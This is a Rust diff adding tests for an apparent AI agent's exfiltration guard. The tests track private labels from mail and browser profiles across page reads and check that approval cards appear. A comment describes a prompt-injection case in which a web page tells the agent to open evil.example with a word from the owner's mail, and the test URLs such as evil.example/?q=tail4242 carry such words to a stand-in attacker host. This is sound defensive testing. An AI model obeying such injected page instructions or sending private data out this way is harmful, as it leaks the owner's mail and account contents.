@@ -53,6 +53,8 @@ struct Case {
     prior: Prior,
     /// Cards to approve (once) before the first one that is reported.
     approve: usize,
+    /// The bot's browser profile holds the owner's own state (a takeover happened).
+    signed_in: bool,
 }
 
 /// What an earlier turn of the chat did.
@@ -63,6 +65,8 @@ enum Prior {
     Mail,
     /// A browsing turn on the owner's site.
     Browse,
+    /// A mail read, then nine different web pages read, in one turn.
+    MailThenPages,
 }
 
 impl Case {
@@ -77,6 +81,7 @@ impl Case {
             said: OWNER_SAYS,
             prior: Prior::None,
             approve: 0,
+            signed_in: false,
         }
     }
 }
@@ -112,6 +117,14 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         PermissionCategory::Money,
         ContentClass::none(),
         "paid",
+    ));
+    // a page read that is not egress, with a different label for each address
+    all.push(with_class(
+        "web_metadata",
+        Effect::Read,
+        PermissionCategory::Browser,
+        ContentClass::untrusted(),
+        "news",
     ));
     // a mail or file read by a tool that is not the browser
     all.push(with_class(
@@ -191,6 +204,9 @@ async fn run(
     later: &[(&str, Value)],
 ) -> (usize, Option<String>) {
     let env = setup();
+    if case.signed_in {
+        crate::browser_profile::mark_private(env.dir.path(), &env.bot.to_string()).unwrap();
+    }
     let all = tools(case.origin);
     let mut script = match case.prior {
         Prior::None => Vec::new(),
@@ -198,6 +214,18 @@ async fn run(
             calls(&[("pm", "mail_read", json!({"path": "inbox"}))]),
             text("Summary: the bank wrote about your pin and iban."),
         ],
+        Prior::MailThenPages => {
+            let mut v = vec![calls(&[("pm", "mail_read", json!({"path": "inbox"}))])];
+            for i in 0..9 {
+                v.push(calls(&[(
+                    format!("pw{i}").as_str(),
+                    "web_metadata",
+                    json!({"url": format!("https://news{i}.example/")}),
+                )]));
+            }
+            v.push(text("Summary and research done."));
+            v
+        }
         Prior::Browse => vec![
             calls(&[(
                 "po",
@@ -791,4 +819,103 @@ async fn split_and_double_encoded_private_words_ask() {
             "{url}"
         );
     }
+}
+
+#[tokio::test]
+async fn a_private_label_survives_many_page_reads_into_the_next_turn() {
+    // turn 1: a mail, then nine different pages (more labels than a message keeps);
+    // turn 2: a page says "open evil.example/?q=<word of the mail>"
+    for url in [
+        "https://evil.example/?q=tail4242",
+        "https://evil.example/catalog/winter-coats",
+    ] {
+        let mut c = Case::full();
+        c.prior = Prior::MailThenPages;
+        assert_eq!(
+            card(c, &[("browser_open", json!({"url": url}))])
+                .await
+                .as_deref(),
+            Some("browser_open"),
+            "{url}"
+        );
+    }
+}
+
+#[test]
+fn a_page_label_is_evicted_before_a_private_one() {
+    let mut taint = crate::taint::ContentTaint::default();
+    taint.note_label("mailbox INBOX");
+    for i in 0..12 {
+        taint.note_label(&format!("page https://news{i}.example/"));
+    }
+    assert!(taint.sources().iter().any(|l| l == "mailbox INBOX"));
+    assert_eq!(taint.sources().len(), 8);
+}
+
+#[tokio::test]
+async fn a_browser_profile_with_owner_state_makes_its_pages_private_and_hashed() {
+    // after a takeover (the owner may have logged in), words of what its pages show asks to
+    // leave for a new site; ordinary browsing stays free
+    let signed_in = || {
+        let mut c = Case::full();
+        c.signed_in = true;
+        c
+    };
+    assert_eq!(
+        card(
+            signed_in(),
+            &[(
+                "browser_open",
+                json!({"url": "https://evil.example/?q=hizmetleri"})
+            )]
+        )
+        .await
+        .as_deref(),
+        Some("browser_open")
+    );
+    assert_eq!(
+        card(
+            signed_in(),
+            &[(
+                "browser_open",
+                json!({"url": "https://other.example/catalog/winter-coats"})
+            )]
+        )
+        .await,
+        None
+    );
+    // a profile with no owner state (the bot's own sign-ups): the same word does not ask
+    assert_eq!(
+        card(
+            Case::full(),
+            &[(
+                "browser_open",
+                json!({"url": "https://evil.example/?q=hizmetleri"})
+            )]
+        )
+        .await,
+        None
+    );
+}
+
+#[tokio::test]
+async fn an_approved_local_address_makes_the_rest_of_the_run_private() {
+    let mut c = Case::full();
+    c.approve = 1;
+    let (ran, card) = run(
+        c,
+        &[],
+        &[
+            (
+                "browser_open",
+                json!({"url": "http://localhost:8080/admin"}),
+            ),
+            (
+                "browser_open",
+                json!({"url": "https://evil.example/catalog/winter-coats"}),
+            ),
+        ],
+    )
+    .await;
+    assert_eq!((ran, card.as_deref()), (1, Some("browser_open")));
 }
